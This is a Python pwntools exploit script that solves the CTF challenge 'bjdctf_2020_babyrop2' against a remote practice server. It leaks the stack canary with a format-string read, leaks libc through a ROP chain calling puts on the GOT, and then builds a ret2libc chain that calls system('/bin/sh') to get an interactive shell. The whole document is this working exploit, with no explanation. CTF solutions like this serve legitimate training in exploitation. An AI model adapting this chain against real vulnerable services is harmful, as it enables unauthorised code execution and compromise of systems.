from pwn import *

context.log_level = "debug"

exe = ELF("./bjdctf_2020_babyrop2")
# libc = exe.libc
# r = exe.process()
libc = ELF("./libc-2.23.so")
r = remote("node4.buuoj.cn", 25066)

# 0x0000000000400993 : pop rdi ; ret
# 0x00000000004005f9 : ret
pop_rdi = p64(0x400993)
ret = p64(0x4005F9)

r.recvuntil(b"u!\n")
r.sendline(b"%7$p")
canary = p64(int(r.recvline().strip(), 16))
success("canary: " + hex(u64(canary)))
r.recvuntil(b"story!\n")
r.send(
    cyclic(24)
    + canary
    + p64(0)
    + pop_rdi
    + p64(exe.got["puts"])
    + p64(exe.plt["puts"])
    + p64(exe.sym["vuln"])
)
libc_puts = u64(r.recvline().strip() + b"\x00\x00")
libc_base = libc_puts - libc.sym["puts"]
libc_system = libc_base + libc.sym["system"]
libc_bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
r.recvuntil(b"story!\n")
r.send(
    cyclic(24) + canary + p64(0) + ret + pop_rdi + p64(libc_bin_sh) + p64(libc_system)
)
r.interactive()
